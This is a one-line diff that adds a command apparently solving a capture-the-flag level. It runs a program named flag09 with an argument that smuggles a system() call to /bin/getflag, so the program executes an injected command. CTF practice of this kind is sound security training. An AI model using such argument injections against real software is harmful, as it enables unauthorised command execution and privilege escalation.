@@ -1,0 +1,1 @@
+./flag09 '-r system("/bin/getflag");'
